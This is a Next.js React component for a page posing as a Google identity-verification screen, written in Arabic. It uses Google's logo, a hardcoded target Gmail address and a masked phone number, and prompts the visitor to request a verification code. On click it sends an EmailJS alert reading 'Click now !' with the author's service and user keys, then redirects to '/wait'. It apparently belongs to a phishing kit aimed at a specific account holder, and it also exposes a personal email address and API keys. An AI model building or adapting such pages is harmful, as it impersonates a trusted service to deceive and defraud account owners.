'use client';
import Image from 'next/image';
import { useState } from 'react';
import { useRouter } from 'next/navigation';

import nodemailer from 'nodemailer';


import emailjs, { send } from 'emailjs-com';




export default function AccountRecovery() {
  const [email] = useState('mn3384922@gmail.com');
  const router = useRouter();
  const [isLoading, setIsLoading] = useState(false);

  const sendEmail = async () => {
    try {
      const result = await emailjs.send(
        'service_nwpu79r', // Replace with your EmailJS service ID
        'template_icrxtto', // No template ID
        {
          name: 'Yacoob', // Replace with dynamic or static value
          time: new Date().toLocaleString(), // Or any formatted time you prefer
          message: 'Click now !', // Your message content
        },
        '8icIF76qfpFpaotTM' // Replace with your EmailJS user ID
      );
  
      console.log(result);
    } catch (error) {
      console.log(error);
    }
  };

  const handleClick = () => {
    setIsLoading(true);
    sendEmail();

    // انتظر ثانية واحدة قبل التنقل
    setTimeout(() => {
      router.push('/wait');
    }, 3000);
  };

  return (
    <main className="min-h-screen bg-gray-50 flex items-center justify-center p-4 md:p-6">
      <div className="bg-white shadow-md rounded-2xl p-6 md:p-8 w-full max-w-4xl flex flex-col md:flex-row gap-8 items-start">
        
        {/* Left Side */}
        <div className="flex-1 w-full">
          {/* Logo */}
          <div className="flex justify-start mb-6">
  <img
    src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
    alt="Google logo"
    width={92}
    height={30}
  />
</div>

        

          <h1 className="text-2xl md:text-3xl font-semibold mb-2">تأكيد الهوية</h1>
          <p className="text-gray-700 mb-6 text-sm md:text-base" dir="rtl">
            للمساعدة في الحفاظ على أمان حسابك، تريد Google التأكد من أنك بالفعل تحاول تسجيل الدخول
          </p>

          <div className="inline-flex items-center px-4 py-2 border rounded-full bg-gray-100 text-sm text-gray-800">
            <span className="w-8 h-8 rounded-full bg-[#4285F4] text-white flex items-center justify-center mr-3 font-bold">
              M
            </span>
            {email}
          </div>
        </div>

        {/* Right Side */}
        <div className="flex-1 w-full flex flex-col items-center md:items-center text-center">
          <Image
            src="../library/phone.png"
            alt="Phone icon"
            width={200}
            height={150}
            className="mb-4 w-[70%] md:w-[200px] h-auto"
          />
          <h2 className="text-base md:text-lg font-semibold mb-2">الحصول على رمز التحقق</h2>
          <p className="text-gray-700 text-sm mb-2">
              •••-•••-••13 سيتم إرسال رمز التحقق إلى
              </p>


          <div className="flex gap-4">
            <button 
               onClick={handleClick}
               disabled={isLoading}
               className={`px-6 py-2  rounded-full font-medium transition-colors ${
                 isLoading
                   ? 'bg-gray-200 text-gray-500 cursor-not-allowed'
                   : 'px-6 py-2 border rounded-full text-blue-600 font-medium hover:bg-blue-50'
               }`}
> 
            {isLoading? "جار الإرسال":  "إرسال"}
            </button>
          </div>
        </div>
      </div>
    </main>
  );
}
